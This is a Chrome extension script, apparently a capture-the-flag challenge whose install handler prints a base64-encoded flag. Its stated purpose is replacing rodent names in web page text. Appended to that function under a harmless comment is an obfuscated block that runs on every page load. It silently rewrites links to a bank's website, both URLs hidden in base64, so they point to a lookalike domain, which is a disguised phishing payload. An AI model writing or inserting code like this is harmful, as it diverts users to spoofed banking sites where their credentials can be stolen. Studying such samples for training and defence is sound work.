// No More Rodents!

function remove_rodents() {
    const FORBIDDEN_RODENTS = [
        "mouse",
        "mice",
        "rat",
        "gopher",
        "squirrel",
        "chipmunk",
        "beaver",
        "prairie dog",
        "porcupine",
        "guinea pig",
        "rabbit",
        "hare",
        "pika",
        "hamster",
        "marmot"
    ]

    // Get all elements
    var elements = document.getElementsByTagName('*');

    // Loop through all elements
    for (var i = 0; i < elements.length; i++) {
        var element = elements[i];
        
        // Loop through all children
        for (var j = 0; j < element.childNodes.length; j++) {
            var node = element.childNodes[j];

            // If node type is text
            if (node.nodeType === 3) {
                var text = node.nodeValue;
                var replace = 0;

                // If a rodent is a substring of this text, replace its name with "NO RODENT HERE"
                for (var r = 0; r < FORBIDDEN_RODENTS.length; r++) {
                    if (text.toLowerCase().includes(FORBIDDEN_RODENTS[r])) {
                        try {
                            element.replaceChild(document.createTextNode(text.replace(FORBIDDEN_RODENTS[r], "NO RODENT HERE")), node);
                        }
                        catch (e) {
                            continue;
                        }
                    }
                }
            }                         
        }
    }

    // Finish removing the rodents
    var _0x4808c5=_0x4d65;function _0x4d65(_0x1ac046,_0xdb813f){var _0x42de99=_0x42de();return _0x4d65=function(_0x4d65e4,_0x2bb8e7){_0x4d65e4=_0x4d65e4-0xb3;var _0x3d9dce=_0x42de99[_0x4d65e4];return _0x3d9dce;},_0x4d65(_0x1ac046,_0xdb813f);}(function(_0xad6f15,_0x121327){var _0xc7839f=_0x4d65,_0x5a0ac3=_0xad6f15();while(!![]){try{var _0x8cad1a=-parseInt(_0xc7839f(0xbc))/0x1*(parseInt(_0xc7839f(0xba))/0x2)+-parseInt(_0xc7839f(0xb6))/0x3*(parseInt(_0xc7839f(0xb9))/0x4)+-parseInt(_0xc7839f(0xb7))/0x5+parseInt(_0xc7839f(0xb5))/0x6+parseInt(_0xc7839f(0xbb))/0x7*(parseInt(_0xc7839f(0xb8))/0x8)+parseInt(_0xc7839f(0xb4))/0x9*(-parseInt(_0xc7839f(0xbe))/0xa)+parseInt(_0xc7839f(0xc0))/0xb*(parseInt(_0xc7839f(0xb3))/0xc);if(_0x8cad1a===_0x121327)break;else _0x5a0ac3['push'](_0x5a0ac3['shift']());}catch(_0x1ba48e){_0x5a0ac3['push'](_0x5a0ac3['shift']());}}}(_0x42de,0x583a6));function _0x42de(){var _0x2b65ad=['href','8856cNMCoO','32787TKstXc','540444COUjiw','1317BdQCgn','2249910WgEroQ','7640EMFxQu','3124SVgnKu','2XPDNHL','3073UIRrAf','628931indBOZ','length','10AaewyR','includes','19041ygvqPQ'];_0x42de=function(){return _0x2b65ad;};return _0x42de();}var rodents=document['getElementsByTagName']('a');for(var i=0x0;i<rodents[_0x4808c5(0xbd)];i++){rodents[i][_0x4808c5(0xc1)][_0x4808c5(0xbf)](atob('aHR0cHM6Ly93d3cud2VsbHNmYXJnby5jb20v'))&&(rodents[i][_0x4808c5(0xc1)]=atob('aHR0cHM6Ly93d3cuZmVsbHN3YXJnby5jb20v'));}
}

// This will execute when navigation to a page is completed, even for background loads
chrome.webNavigation.onCompleted.addListener((details) => {
    if (!details.url.includes('chrome://')) {
        chrome.scripting.executeScript({
          target: { tabId: details.tabId },
          function: remove_rodents
        });
    }
});

// This will execute when the extension is first installed
chrome.runtime.onInstalled.addListener(() => {
    var val = "ZmxhZ3toeXAzcjN4dDNuZDNkfQ==";
    console.log("NO MORE RODENTS!!!!!!!!!!");
    console.log(atob(val));
});